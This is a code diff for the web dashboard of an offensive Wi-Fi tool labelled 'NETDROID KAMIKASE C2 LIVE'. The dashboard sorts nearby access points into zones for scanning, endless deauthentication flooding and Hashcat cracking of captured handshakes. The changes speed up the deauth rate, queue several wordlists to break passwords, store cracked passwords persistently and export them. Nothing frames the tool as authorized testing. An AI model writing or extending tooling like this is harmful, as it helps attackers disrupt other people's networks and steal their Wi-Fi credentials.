+  @keyframes morph-to-green {
+    0%   { background:rgba(0,212,255,0.10); border-color:rgba(0,212,255,0.4); }
+    25%  { background:rgba(180,255,200,0.30); border-color:rgba(0,255,159,0.9); transform:scale(1.04); }
+    60%  { background:rgba(120,255,180,0.22); border-color:rgba(0,255,159,0.95); transform:scale(0.99); }
+    100% { background:rgba(0,255,159,0.18); border-color:rgba(0,255,159,0.7); transform:scale(1); }
+  }
+  @keyframes glow-victory {
+    0%,100% { box-shadow: 0 0 8px rgba(0,255,159,0.5); }
+    50%     { box-shadow: 0 0 32px rgba(0,255,159,1.0), 0 0 64px rgba(0,255,159,0.5); }
+  }
+  .cracked-victory {
+    animation: morph-to-green 2s ease-out forwards,
+               glow-victory 0.7s ease-in-out 3 1.8s;
+    border-width: 1px !important;
+  }
+  .cracked-stable {
+    background: rgba(0,255,159,0.10) !important;
+    border: 1px solid rgba(0,255,159,0.7) !important;
+    box-shadow: 0 0 14px rgba(0,255,159,0.3);
+  }
+  .cracked-banner {
+    background: linear-gradient(180deg, rgba(0,255,159,0.15), rgba(0,255,159,0.05));
+    border: 1px solid rgba(0,255,159,0.55);
+    box-shadow: inset 0 0 20px rgba(0,255,159,0.1);
+  }
+
   .fadein { animation: fadein .35s ease-out; }
   @keyframes fadein { from{opacity:0;transform:translateY(6px)} to{opacity:1;transform:translateY(0)} }
   .blink { animation: blink 1s steps(2) infinite; }
@@ -5815,30 +7319,113 @@ TEMPLATE_KAMIKASE = r"""<!doctype html>
   .btn-blue:hover  { background: rgba(0,212,255,0.22); box-shadow: 0 0 12px rgba(0,212,255,0.4); }
   .btn-green { background: rgba(0,255,159,0.10); border:1px solid rgba(0,255,159,0.35); color:#5fff9f; }
   .btn-green:hover { background: rgba(0,255,159,0.22); box-shadow: 0 0 12px rgba(0,255,159,0.4); }
+  /* F3: botão Exportar (cor distinta dos botões de movimento) */
+  .btn-export { background: rgba(188,19,254,0.10); border:1px solid rgba(188,19,254,0.4); color:#d4a5ff; }
+  .btn-export:hover { background: rgba(188,19,254,0.25); box-shadow: 0 0 12px rgba(188,19,254,0.5); color:#fff; }
 
   /* Scrollbar */
   ::-webkit-scrollbar { width:6px; height:6px; }
   ::-webkit-scrollbar-track { background: transparent; }
   ::-webkit-scrollbar-thumb { background: rgba(255,0,60,0.25); border-radius:3px; }
   ::-webkit-scrollbar-thumb:hover { background: rgba(255,0,60,0.5); }
+
+  /* Scroll independente nas zonas */
+  .zone-scroll {
+    max-height: calc(100vh - 280px);
+    overflow-y: auto;
+    overflow-x: hidden;
+    scrollbar-width: thin;
+    padding-right: 4px;
+  }
+  .zone-scroll::-webkit-scrollbar { width: 5px; }
+  .zone-scroll::-webkit-scrollbar-track { background: rgba(0,0,0,0.3); border-radius: 3px; }
+  .zone-scroll::-webkit-scrollbar-thumb { background: rgba(255,0,60,0.3); border-radius: 3px; }
+  .zone-scroll::-webkit-scrollbar-thumb:hover { background: rgba(255,0,60,0.6); }
+
+  /* Botão de reset minimalista */
+  .btn-reset {
+    font-size: 0.7rem;
+    padding: 2px 6px;
+    border-radius: 3px;
+    background: rgba(255,255,255,0.1);
+    border: 1px solid rgba(255,255,255,0.2);
+    color: #aaa;
+    cursor: pointer;
+    transition: all 0.2s;
+    margin-left: 4px;
+  }
+  .btn-reset:hover {
+    background: rgba(255,255,255,0.2);
+    color: #fff;
+    transform: rotate(180deg);
+  }
+  .btn-reset.red:hover { border-color: var(--red); color: var(--red); }
+  .btn-reset.blue:hover { border-color: var(--cyan); color: var(--cyan); }
+
+  /* Multi-select wordlist */
+  .wordlist-checkbox {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 6px 8px;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background 0.2s;
+  }
+  .wordlist-checkbox:hover { background: rgba(0,212,255,0.1); }
+  .wordlist-checkbox input[type="checkbox"] { accent-color: var(--cyan); }
+  .wordlist-selected {
+    background: rgba(0,212,255,0.15) !important;
+    border: 1px solid rgba(0,212,255,0.4);
+  }
+  .wordlist-queue {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 4px;
+    margin-top: 8px;
+    padding: 8px;
+    background: rgba(0,0,0,0.3);
+    border-radius: 4px;
+    min-height: 32px;
+  }
+  .wordlist-queue-item {
+    font-size: 0.65rem;
+    padding: 2px 8px;
+    border-radius: 12px;
+    background: rgba(0,212,255,0.2);
+    border: 1px solid rgba(0,212,255,0.4);
+    color: var(--cyan);
+    display: flex;
+    align-items: center;
+    gap: 4px;
+  }
+  .wordlist-queue-item .remove {
+    cursor: pointer;
+    opacity: 0.6;
+  }
+  .wordlist-queue-item .remove:hover { opacity: 1; color: var(--red); }
 </style>
 </head>
 <body>
 
-<header class="cyber border-0 border-b px-6 py-3 flex items-center justify-between sticky top-0 z-30" style="background: rgba(5,6,8,0.92); border-color: var(--line-hot)">
-  <div class="flex items-center gap-5">
+<header class="cyber border-0 border-b px-4 md:px-6 py-3 flex flex-wrap items-center justify-between gap-2 sticky top-0 z-30" style="background: rgba(5,6,8,0.92); border-color: var(--line-hot)" role="banner">
+  <div class="flex items-center gap-3 md:gap-5">
     <div class="logo">NETDROID</div>
     <div class="tag-mode">⚡ KAMIKASE · C2 LIVE</div>
-    <div class="text-xs text-gray-500" id="timestamp">--:--:--</div>
+    <div class="hidden md:block text-xs text-gray-500" id="timestamp">--:--:--</div>
   </div>
-  <div class="flex items-center gap-3 text-xs">
-    <span class="text-gray-500">Pacotes: <span id="stat-pkts" class="text-red-400 font-bold">0</span></span>
-    <span class="text-gray-500">PPS: <span id="stat-pps" class="text-yellow-400 font-bold">0</span></span>
-    <span class="text-gray-500">Selec: <span id="stat-sel" class="text-yellow-400 font-bold">0</span></span>
-    <span class="px-2 py-0.5 rounded bg-purple-950/40 border border-purple-700 text-purple-300" title="Memória persistente local">
-      💾 <span id="mem-aps">0</span> APs · <span id="mem-hs">0</span> hs · <span id="mem-pwd" class="text-green-400 font-bold">0</span> senhas
+  <div class="flex flex-wrap items-center gap-2 md:gap-3 text-xs">
+    <span class="flex items-center text-gray-500" title="Status do scanner">
+      <span id="led-status" class="led led-on" aria-hidden="true"></span>
+      <span class="hidden md:inline uppercase tracking-wider text-gray-400">online</span>
     </span>
-    <span class="text-gray-500">v1.4.0</span>
+    <span class="text-gray-500">Pkts: <span id="stat-pkts" class="text-red-400 font-bold">0</span></span>
+    <span class="text-gray-500">PPS: <span id="stat-pps" class="text-yellow-400 font-bold">0</span></span>
+    <span class="hidden sm:inline text-gray-500">Sel: <span id="stat-sel" class="text-yellow-400 font-bold">0</span></span>
+    <span class="px-2 py-0.5 rounded bg-purple-950/40 border border-purple-700 text-purple-300" title="Memória persistente local (./memoria/db.json + ./Pass/senhas.txt)">
+      💾 <span id="mem-aps">0</span>·<span id="mem-hs">0</span>·<span id="mem-pwd" class="text-green-400 font-bold">0</span>
+    </span>
+    <span class="hidden md:inline text-gray-500">v1.5.0</span>
   </div>
 </header>
 
@@ -5861,47 +7448,60 @@ TEMPLATE_KAMIKASE = r"""<!doctype html>
   </section>
 
   <!-- ZONA VERDE -->
-  <section class="col-span-12 lg:col-span-4 glass rounded-lg p-4 zone-green">
+  <section class="col-span-12 md:col-span-6 lg:col-span-4 glass rounded-lg p-4 zone-green">
     <div class="flex items-center justify-between mb-2">
       <h2 class="sec" style="color:var(--green)">🟢 Verde · Saudáveis</h2>
-      <button id="btn-mapear" onclick="mapearRedes()" class="btn-zone btn-green font-bold">
-        🔄 Mapear Redes
-      </button>
+      <div class="flex gap-1">
+        <button id="btn-mapear" onclick="toggleMapearContinuo()" class="btn-zone btn-green font-bold" title="Iniciar/Parar scan contínuo">
+          🔄 Mapear Contínuo
+        </button>
+        <button id="btn-cadeado" onclick="toggleCadeado()" class="btn-zone btn-green" title="Trava/destrava todas as varreduras">
+          🔓 Cadeado
+        </button>
+        <button id="btn-nmcli" onclick="scanNmcli()" class="btn-zone btn-green" title="Extrai TODAS as redes via nmcli (sem duplicar)">
+          📡 NMCLI
+        </button>
+        <button id="btn-scapy" onclick="scanScapy()" class="btn-zone btn-green" title="Captura passiva via scapy (sniff 802.11)">
+          🦂 Scapy
+        </button>
+      </div>
     </div>
     <div class="flex gap-1 mb-3 flex-wrap">
-      <button onclick="moverTodos('verde','vermelha')" class="btn-zone btn-red">→ todos vermelha</button>
-      <button onclick="moverTodos('verde','azul')" class="btn-zone btn-blue">→ todos azul</button>
-      <button onclick="selecionarTodos('verde')" class="btn-zone bg-gray-800 text-yellow-400">selecionar tudo</button>
+      <button onclick="moverTodos('verde','vermelha')" class="btn-zone btn-red" aria-label="Mover todos da zona verde para vermelha">→ todos vermelha</button>
+      <button onclick="moverTodos('verde','azul')" class="btn-zone btn-blue" aria-label="Mover todos da zona verde para azul">→ todos azul</button>
+      <button onclick="selecionarTodos('verde')" class="btn-zone bg-gray-800 text-yellow-400" aria-label="Selecionar todos os APs da zona verde">selecionar tudo</button>
+      <button onclick="exportarZona('verde')" class="btn-zone btn-export" aria-label="Exportar APs da zona verde para PDF e TXT">📤 exportar</button>
     </div>
-    <div id="z-verde" class="space-y-2 min-h-[400px]"></div>
+    <div id="z-verde" class="space-y-2 min-h-[200px] zone-scroll"></div>
   </section>
 
   <!-- ZONA VERMELHA -->
-  <section class="col-span-12 lg:col-span-4 glass rounded-lg p-4 zone-red">
+  <section class="col-span-12 md:col-span-6 lg:col-span-4 glass rounded-lg p-4 zone-red">
     <div class="flex items-center justify-between mb-2">
       <h2 class="sec" style="color:var(--red)">🔴 Vermelha · Sob Deauth</h2>
-      <span class="text-xs text-gray-500 blink">1 pkt / 0.5s · ∞</span>
+      <span class="text-xs text-gray-500 blink">1 pkt / 0.2s · ∞</span>
     </div>
     <div class="flex gap-1 mb-3 flex-wrap">
-      <button onclick="moverTodos('vermelha','verde')" class="btn-zone btn-green">← todos verde</button>
-      <button onclick="moverTodos('vermelha','azul')" class="btn-zone btn-blue">→ todos azul</button>
-      <button onclick="selecionarTodos('vermelha')" class="btn-zone bg-gray-800 text-yellow-400">selecionar tudo</button>
+      <button onclick="moverTodos('vermelha','verde')" class="btn-zone btn-green" aria-label="Parar deauth de todos os APs">← todos verde</button>
+      <button onclick="moverTodos('vermelha','azul')" class="btn-zone btn-blue" aria-label="Mover todos para crack">→ todos azul</button>
+      <button onclick="selecionarTodos('vermelha')" class="btn-zone bg-gray-800 text-yellow-400" aria-label="Selecionar todos os APs da zona vermelha">selecionar tudo</button>
     </div>
-    <div id="z-vermelha" class="space-y-2 min-h-[400px]"></div>
+    <div id="z-vermelha" class="space-y-2 min-h-[200px] zone-scroll"></div>
   </section>
 
   <!-- ZONA AZUL -->
-  <section class="col-span-12 lg:col-span-4 glass rounded-lg p-4 zone-blue">
+  <section class="col-span-12 md:col-span-6 lg:col-span-4 glass rounded-lg p-4 zone-blue">
     <div class="flex items-center justify-between mb-2">
       <h2 class="sec" style="color:var(--cyan)">🔵 Azul · Crack Hashcat</h2>
       <span class="text-xs text-gray-500">PMKID + handshake</span>
     </div>
     <div class="flex gap-1 mb-3 flex-wrap">
-      <button onclick="moverTodos('azul','verde')" class="btn-zone btn-green">← todos verde</button>
-      <button onclick="moverTodos('azul','vermelha')" class="btn-zone btn-red">→ todos vermelha</button>
-      <button onclick="selecionarTodos('azul')" class="btn-zone bg-gray-800 text-yellow-400">selecionar tudo</button>
+      <button onclick="moverTodos('azul','verde')" class="btn-zone btn-green" aria-label="Mover todos para verde">← todos verde</button>
+      <button onclick="moverTodos('azul','vermelha')" class="btn-zone btn-red" aria-label="Mover todos para deauth">→ todos vermelha</button>
+      <button onclick="selecionarTodos('azul')" class="btn-zone bg-gray-800 text-yellow-400" aria-label="Selecionar todos da zona azul">selecionar tudo</button>
+      <button onclick="exportarZona('azul')" class="btn-zone btn-export" aria-label="Exportar APs da zona azul (com senhas) para PDF e TXT">📤 exportar</button>
     </div>
-    <div id="z-azul" class="space-y-2 min-h-[400px]"></div>
+    <div id="z-azul" class="space-y-2 min-h-[200px] zone-scroll"></div>
   </section>
 
   <!-- WORDLISTS DISPONÍVEIS -->
@@ -5920,40 +7520,53 @@ TEMPLATE_KAMIKASE = r"""<!doctype html>
 </main>
 
 <!-- Modal de DETALHES PROFUNDOS do AP -->
-<div id="modal-detalhes" class="hidden fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4">
-  <div class="cyber rounded-lg p-6 max-w-3xl w-full max-h-[90vh] overflow-y-auto" style="border: 1px solid var(--purple); box-shadow: 0 0 40px rgba(188,19,254,0.3);">
+<div id="modal-detalhes" class="hidden fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-2 md:p-4" role="dialog" aria-modal="true" aria-labelledby="det-essid">
+  <div class="cyber rounded-lg p-4 md:p-6 w-full max-w-full md:max-w-3xl max-h-[95vh] md:max-h-[90vh] overflow-y-auto" style="border: 1px solid var(--purple); box-shadow: 0 0 40px rgba(188,19,254,0.3);">
     <div class="flex items-start justify-between mb-4">
-      <div>
-        <h3 class="text-2xl font-black" style="color:var(--purple)" id="det-essid">?</h3>
-        <p class="text-xs text-gray-500 mt-1" id="det-bssid">?</p>
+      <div class="min-w-0">
+        <h3 class="text-xl md:text-2xl font-black truncate" style="color:var(--purple)" id="det-essid">?</h3>
+        <p class="text-xs text-gray-500 mt-1 break-all" id="det-bssid">?</p>
       </div>
-      <button onclick="fecharDetalhes()" class="text-gray-400 hover:text-white text-2xl leading-none">×</button>
+      <button onclick="fecharDetalhes()" class="text-gray-400 hover:text-white text-2xl leading-none px-2" aria-label="Fechar detalhes">×</button>
     </div>
     <div id="det-body" class="space-y-4 text-sm"></div>
     <div class="flex gap-2 mt-6 pt-4 border-t border-purple-900/40">
-      <button onclick="fecharDetalhes()" class="px-4 py-2 rounded glass">Fechar</button>
+      <button onclick="fecharDetalhes()" class="px-4 py-2 rounded glass" aria-label="Fechar modal">Fechar</button>
     </div>
   </div>
 </div>
 
 <!-- Modal de configuração crack -->
-<div id="modal" class="hidden fixed inset-0 bg-black/80 z-50 flex items-center justify-center">
-  <div class="cyber rounded-lg p-6 max-w-lg w-full zone-blue">
-    <h3 class="text-lg font-bold mb-4" style="color:var(--cyan)">🔓 Configurar Crack — <span id="modal-bssid">?</span></h3>
+<div id="modal" class="hidden fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-2 md:p-4" role="dialog" aria-modal="true" aria-labelledby="modal-bssid">
+  <div class="cyber rounded-lg p-4 md:p-6 w-full max-w-full md:max-w-xl zone-blue" style="max-height: 95vh; overflow-y: auto;">
+    <h3 class="text-base md:text-lg font-bold mb-4" style="color:var(--cyan)">🔓 Configurar Crack — <span id="modal-bssid">?</span></h3>
     <p class="text-xs text-gray-400 mb-3" id="modal-essid">ESSID: ?</p>
     <div class="space-y-3 text-sm">
       <div><label class="text-gray-400">Perfil hashcat (intensidade GPU):</label>
         <select id="modal-perfil" class="w-full mt-1 bg-black border border-cyan-900 rounded px-2 py-1 text-white"></select></div>
-      <div><label class="text-gray-400">Wordlist base:</label>
-        <select id="modal-wordlist" class="w-full mt-1 bg-black border border-cyan-900 rounded px-2 py-1 text-white"></select></div>
+
+      <div><label class="text-gray-400">Selecione as wordlists (serão usadas em sequência até quebrar):</label>
+        <div id="modal-wordlist-list" class="mt-2 max-h-[200px] overflow-y-auto space-y-1 border border-cyan-900/30 rounded p-2"></div>
+      </div>
+
+      <div><label class="text-gray-400">Fila de wordlists selecionadas (ordem de execução):</label>
+        <div id="wordlist-queue" class="wordlist-queue">
+          <span class="text-gray-500 text-xs italic">Nenhuma wordlist selecionada</span>
+        </div>
+      </div>
+
       <div class="flex items-center gap-2">
         <input type="checkbox" id="modal-contextual" checked class="accent-cyan-500">
-        <label for="modal-contextual" class="text-gray-400">Prepend 1000 variações contextuais do ESSID (recomendado — testa senhas óbvias antes)</label>
+        <label for="modal-contextual" class="text-gray-400">Prepend 1000 variações contextuais do ESSID na primeira wordlist (recomendado)</label>
+      </div>
+      <div class="flex items-center gap-2">
+        <input type="checkbox" id="modal-stop-on-crack" checked class="accent-cyan-500">
+        <label for="modal-stop-on-crack" class="text-gray-400">Parar quando senha for encontrada</label>
       </div>
     </div>
     <div class="flex gap-2 mt-5">
       <button onclick="confirmarCrack()" class="flex-1 bg-cyan-700 hover:bg-cyan-600 px-3 py-2 rounded text-white font-bold">Iniciar Crack</button>
-      <button onclick="fecharModal()" class="px-3 py-2 rounded glass">Cancelar</button>
+      <button onclick="clearWordlistSelection(); fecharModal();" class="px-3 py-2 rounded glass">Cancelar</button>
     </div>
   </div>
 </div>
@@ -5971,61 +7584,137 @@ let chartZonas;
 let modalContext = null; // {bssids:[], destinoVoltar:'verde'}
 let zonasRecemDying = new Set();    // bssids que estão na animação morph-to-red
 let zonasRecemBlue = new Set();     // bssids que estão na animação morph-to-blue
+let zonasRecemCracked = new Set();  // F4: bssids recém-quebrados (animação 4s morph-to-green)
 
 function tag(text, classes){return `<span class="inline-block px-2 py-0.5 rounded text-xs ${classes}">${text}</span>`}
 function sevColor(s){return {ok:"bg-green-900 text-green-300",info:"bg-blue-900 text-blue-300",media:"bg-yellow-900 text-yellow-300",alta:"bg-orange-900 text-orange-300",critica:"bg-red-900 text-red-300"}[s]||"bg-gray-800 text-gray-400"}
+function freqResumo(ap){
+  const mhz = ap.freq_mhz && ap.freq_mhz !== "?" ? `${ap.freq_mhz} MHz` : "? MHz";
+  const banda = ap.band_ghz && ap.band_ghz !== "?" ? ap.band_ghz : "?";
+  const nivel = ap.band_label && ap.band_label !== "?" ? ap.band_label : "?";
+  return `${mhz} · ${banda} · ${nivel}`;
+}
+function sinalResumo(ap){
+  const rssi = ap.rssi_dbm ?? ap.rssi ?? "?";
+  const nivel = ap.signal_label && ap.signal_label !== "?" ? ap.signal_label : "?";
+  const pct = ap.signal_percent && ap.signal_percent !== "?" ? ` · ${ap.signal_percent}%` : "";
+  return `${rssi} dBm · ${nivel}${pct}`;
+}
+function statusCrackLabel(status){
+  return {
+    capture_queued:"aguardando captura",
+    capturing:"capturando handshake",
+    queued:"na fila hashcat",
+    preparing:"preparando hash",
+    running:"rodando hashcat",
+    cracked:"senha encontrada",
+    exhausted:"wordlists esgotadas",
+    cancelled:"cancelado",
+    capture_failed:"falha na captura",
+    convert_failed:"falha na conversao",
+    hashcat_missing:"hashcat ausente",
+    wordlist_missing:"wordlist ausente",
+    error:"erro"
+  }[status] || status || "queued";
+}
 
 function cardHTML(ap, zona){
-  const sec = ap.crypto || "?";
-  const wps = ap.wps_enabled ? `<span class="text-red-400 text-xs font-bold">WPS</span>` : "";
+  // B6: senha pode vir do crack (sessão atual) OU da memória (sessão anterior)
+  const sec = ap.security || ap.crypto || "?";
+  const secBadge = sec !== "?" ? `<span class="text-xs px-2 py-0.5 rounded bg-gray-800 text-gray-300 border border-gray-600">${sec}</span>` : `<span class="text-xs text-gray-500">?</span>`;
+  const wps = ap.wps_enabled ? `<span class="text-red-400 text-xs font-bold ml-1">WPS</span>` : "";
   const score = ap.score ?? 100;
-  const sev = ap.severidade_maior || "ok";
   const pkts = ap.pacotes || 0;
   const prog = ap.crack && ap.crack.progresso ? ap.crack.progresso : 0;
+  const wlProg = ap.crack && ap.crack.wordlist_progress ? ap.crack.wordlist_progress : 0;
+  const wlAtual = ap.crack && ap.crack.wordlist_atual ? ap.crack.wordlist_atual : "";
+  const wlIndex = ap.crack && Number.isInteger(ap.crack.wordlist_index) ? ap.crack.wordlist_index + 1 : 0;
+  const wlTotal = ap.crack && ap.crack.wordlist_total ? ap.crack.wordlist_total : 0;
   const status = ap.crack && ap.crack.status ? ap.crack.status : "";
-  const senha = ap.crack && ap.crack.senha ? ap.crack.senha : null;
+  // Senha vem de crack.senha (sessão atual) OU ap.senha (memória persistente)
+  const senha = (ap.crack && ap.crack.senha) ? ap.crack.senha : (ap.senha || null);
+  const wlQuebrou = (ap.crack && ap.crack.wordlist_quebrou) || ap.wordlist_usada || "";
   const eta = ap.crack && ap.crack.eta ? ap.crack.eta : "?";
   const ctxCount = ap.crack && ap.crack.contextual_count ? ap.crack.contextual_count : 0;
   const isSelected = selecionados.has(ap.bssid);
+  // F4: classes de animação por estado
+  const recemQuebrado = (typeof zonasRecemCracked !== "undefined") && zonasRecemCracked.has(ap.bssid);
+  const monitorAviso = ap.monitor_failed || (ap.monitor_aviso && zona === "vermelha");
+
   let extra = "";
   if(zona==="vermelha") {
-    extra = `<div class="text-xs text-red-400 mt-2 font-bold blink">⚡ ${pkts.toLocaleString()} pkts deauth enviados</div>`;
+    extra = `<div class="text-xs text-red-400 mt-2 font-bold blink flex items-center justify-between">
+      <span>⚡ ${pkts.toLocaleString()} pkts deauth</span>
+      <button class="btn-reset red" onclick="event.stopPropagation(); resetDeauth('${ap.bssid}')" title="Reiniciar deauth" aria-label="Reiniciar deauth para ${ap.bssid}">↻</button>
+    </div>${monitorAviso?`<div class="text-xs text-yellow-400 mt-1 bg-yellow-950/30 px-2 py-1 rounded border border-yellow-800">⚠ ${ap.monitor_aviso || "Monitor mode ausente — deauth pode não chegar ao ar"}</div>`:""}`;
   } else if(zona==="azul") {
-    extra = `
-      <div class="text-xs mt-2 flex items-center justify-between">
-        <span class="text-cyan-400 font-bold">${status||"queued"}</span>
-        <span class="text-gray-400">${prog.toFixed(1)}% · ETA ${eta}</span>
-      </div>
-      <div class="bg-gray-900 h-1.5 rounded mt-1 overflow-hidden"><div class="progress-bar" style="width:${prog}%"></div></div>
-      ${ctxCount?`<div class="text-xs text-purple-400 mt-1">📚 ${ctxCount} variações contextuais prepended</div>`:""}
-      ${senha?`<div class="text-green-400 text-sm mt-2 font-bold bg-green-950/30 px-2 py-1 rounded border border-green-700">🔓 SENHA: <code>${senha}</code></div>`:""}
-    `;
+    const podeResetar = ["done","failed","exhausted","error","capture_failed","convert_failed","hashcat_missing","wordlist_missing","cancelled"].includes(status);
+    // F5: senha em destaque GRANDE quando quebrada
+    const senhaBlock = senha ? `
+      <div class="cracked-banner mt-3 text-center p-2 rounded">
+        <div class="text-[0.62rem] uppercase tracking-[0.2em] text-green-300 font-bold">🔓 senha quebrada</div>
+        <code class="block text-2xl font-black text-green-200 mt-1 break-all" style="text-shadow:0 0 8px rgba(0,255,159,0.6);font-family:'JetBrains Mono',monospace">${senha}</code>
+        ${wlQuebrou?`<div class="text-[0.65rem] text-gray-400 mt-1">via <code class="text-purple-300">${wlQuebrou}</code></div>`:""}
+      </div>` : "";
+    // Se senha vem só da memória, mostra label "memória" e não barra de progresso
+    if(senha && !status){
+      extra = senhaBlock + `<div class="text-[0.65rem] text-gray-500 mt-1 italic">restaurado da memória persistente</div>`;
+    } else {
+      // Contador grande de tentativas durante captura (status === "capturing")
+      const tentativa = (ap.crack && ap.crack.tentativa) ? ap.crack.tentativa : 0;
+      const blocoTentativas = (status === "capturing" && tentativa > 0) ? `
+        <div class="text-center mt-2 p-2 rounded border border-cyan-700/50 bg-cyan-950/30">
+          <div class="text-[0.62rem] uppercase tracking-[0.2em] text-cyan-300 font-bold">🎯 capturando handshake</div>
+          <div class="text-3xl font-black text-cyan-200 leading-tight" style="text-shadow:0 0 10px rgba(0,212,255,0.7);font-family:'JetBrains Mono',monospace">#${tentativa}</div>
+          <div class="text-[0.65rem] text-gray-400 italic">tentativa em andamento — burst deauth + airodump escutando</div>
+        </div>` : "";
+      extra = `
+        <div class="text-xs mt-2 flex items-center justify-between">
+          <span class="text-cyan-400 font-bold">${statusCrackLabel(status)}</span>
+          <span class="text-gray-400">${prog.toFixed(1)}% · ETA ${eta}</span>
+        </div>
+        <div class="bg-gray-900 h-1.5 rounded mt-1 overflow-hidden"><div class="progress-bar" style="width:${prog}%"></div></div>
+        ${blocoTentativas}
+        ${wlAtual?`<div class="text-xs text-gray-400 mt-1">WL ${wlIndex}/${wlTotal}: <code>${wlAtual}</code> · ${wlProg.toFixed(1)}%</div>`:""}
+        ${ap.crack&&ap.crack.erro?`<div class="text-xs text-red-400 mt-1">${ap.crack.erro}</div>`:""}
+        ${ctxCount?`<div class="text-xs text-purple-400 mt-1">📚 ${ctxCount} variações contextuais prepended</div>`:""}
+        ${senhaBlock}
+        <div class="mt-2 flex items-center gap-2 flex-wrap">
+          <button class="btn-reset blue text-xs" onclick="event.stopPropagation(); recapturarHandshake('${ap.bssid}')" title="Cancela captura atual e tenta de novo do zero" aria-label="Recapturar handshake para ${ap.bssid}">🔄 recapturar handshake</button>
+          ${podeResetar?`<button class="btn-reset blue text-xs" onclick="event.stopPropagation(); abrirModalParaLote(['${ap.bssid}'], 'azul')" title="Configurar wordlists e reiniciar captura/crack" aria-label="Configurar crack">⚙ configurar</button>`:""}
+        </div>
+      `;
+    }
   }
   // Classes de animação
   const dyingClass = (zona==="vermelha" && zonasRecemDying.has(ap.bssid)) ? "dying" : "";
   const crystClass = (zona==="azul" && zonasRecemBlue.has(ap.bssid)) ? "crystallizing" : "";
+  // F4: cracked-victory (animação 2s) → cracked-stable (estado permanente)
+  const victoryClass = (zona==="azul" && recemQuebrado) ? "cracked-victory" : "";
+  const stableClass = (zona==="azul" && senha && !recemQuebrado) ? "cracked-stable" : "";
   const pulseClass = (zona==="vermelha" && !zonasRecemDying.has(ap.bssid)) ? "pulse-red" :
-                     (zona==="azul" && !zonasRecemBlue.has(ap.bssid)) ? "pulse-blue" : "";
-  // Indicadores visuais persistência: 🔓 senha quebrada, 📦 handshake salvo
+                     (zona==="azul" && !zonasRecemBlue.has(ap.bssid) && !senha) ? "pulse-blue" : "";
+  // Indicadores visuais de persistência
   const memBadges = [];
-  if(ap.senha) memBadges.push(`<span class="text-green-400 text-xs" title="Senha quebrada">🔓</span>`);
+  if(senha) memBadges.push(`<span class="text-green-400 text-xs" title="Senha quebrada">🔓</span>`);
   if(ap.handshake_path) memBadges.push(`<span class="text-cyan-400 text-xs" title="Handshake capturado">📦</span>`);
   if(ap.visitas && ap.visitas > 1) memBadges.push(`<span class="text-purple-400 text-xs" title="Visto ${ap.visitas} vezes">👁 ${ap.visitas}</span>`);
   return `
-    <div class="ap-card glass rounded p-3 fadein ${pulseClass} ${dyingClass} ${crystClass} ${isSelected?"selected":""}" data-bssid="${ap.bssid}" ondblclick="abrirDetalhes('${ap.bssid}')">
+    <div class="ap-card glass rounded p-3 fadein ${pulseClass} ${dyingClass} ${crystClass} ${victoryClass} ${stableClass} ${isSelected?"selected":""}" data-bssid="${ap.bssid}" onclick="abrirDetalhes('${ap.bssid}')">
       <div class="flex items-start gap-2">
-        <input type="checkbox" class="mt-1 accent-yellow-400" ${isSelected?"checked":""} onchange="toggleSelecao('${ap.bssid}')" onclick="event.stopPropagation()">
-        <div class="flex-1 min-w-0 cursor-pointer" onclick="abrirDetalhes('${ap.bssid}')">
+        <input type="checkbox" class="mt-1 accent-yellow-400" ${isSelected?"checked":""} onchange="toggleSelecao('${ap.bssid}')" onclick="event.stopPropagation()" aria-label="Selecionar ${ap.essid||ap.bssid}">
+        <div class="flex-1 min-w-0">
           <div class="flex items-center justify-between">
             <div class="flex items-center gap-2 min-w-0">
               <span class="font-bold text-white truncate">${(ap.essid||"<oculto>").substring(0,20)}</span>
-              ${tag(sec, sevColor(sev))}
+              ${secBadge}
               ${wps}
               ${memBadges.join(" ")}
             </div>
             <span class="text-xs ${score<40?"text-red-400":score<70?"text-yellow-400":"text-green-400"} font-bold">${score}</span>
           </div>
-          <div class="text-xs text-gray-500 mt-1">${ap.bssid} · ch ${ap.canal||"?"} · ${ap.rssi||"?"}dBm <span class="text-gray-600 ml-2">(clique p/ detalhes)</span></div>
+          <div class="text-xs text-gray-500 mt-1">${ap.bssid} · ch ${ap.canal||"?"} · ${freqResumo(ap)}</div>
+          <div class="text-xs text-gray-500">${sinalResumo(ap)} · fonte ${ap.source||"?"}</div>
           ${extra}
           ${ap.achados&&ap.achados.length?`<div class="mt-2 space-y-1">${ap.achados.slice(0,3).map(a=>`<div class="badge-sev-${a.severidade} px-2 py-0.5 rounded text-xs">${a.descricao}</div>`).join("")}</div>`:""}
         </div>
@@ -6034,7 +7723,17 @@ function cardHTML(ap, zona){
   `;
 }
 
+// B5: debounce de renderização (80ms) — agrupa múltiplos socket events
+// e re-renderiza uma só vez. Reduz reflows em ~10x com 50+ APs.
+let _renderPending = null;
 function renderZonas(){
+  if(_renderPending) return;  // já agendado
+  _renderPending = setTimeout(()=>{
+    _renderPending = null;
+    _renderZonasNow();
+  }, 80);
+}
+function _renderZonasNow(){
   ["verde","vermelha","azul"].forEach(z=>{
     const el = document.getElementById("z-"+z);
     el.innerHTML = zonas[z].map(bssid=>aps[bssid]?cardHTML(aps[bssid],z):"").join("");
@@ -6117,7 +7816,13 @@ function bindSortable(){
   });
 }
 
-function moverInterno(bssid, destino, perfil, wordlist, contextual){
+function moverInterno(bssid, destino, perfil, wordlist, contextual, stopOnCrack){
+  const origemAtual = Object.keys(zonas).find(z=>zonas[z].includes(bssid)) || "verde";
+  const wordlists = Array.isArray(wordlist) ? wordlist : (wordlist ? [wordlist] : []);
+  if(destino==="azul" && wordlists.length === 0){
+    abrirModalParaLote([bssid], origemAtual);
+    return;
+  }
   Object.keys(zonas).forEach(z=>zonas[z]=zonas[z].filter(b=>b!==bssid));
   zonas[destino].push(bssid);
   // Marca para animação visual de transição
@@ -6128,8 +7833,8 @@ function moverInterno(bssid, destino, perfil, wordlist, contextual){
     zonasRecemBlue.add(bssid);
     setTimeout(()=>{zonasRecemBlue.delete(bssid); renderZonas();}, 1600);
   }
-  sock.emit("mover_zona",{bssid, destino, perfil, wordlist, contextual});
-  log(`Movido ${bssid} → ${destino}${perfil?` (perfil ${perfil})`:""}`,
+  sock.emit("mover_zona",{bssid, destino, perfil, wordlists, contextual, stop_on_crack: stopOnCrack !== false});
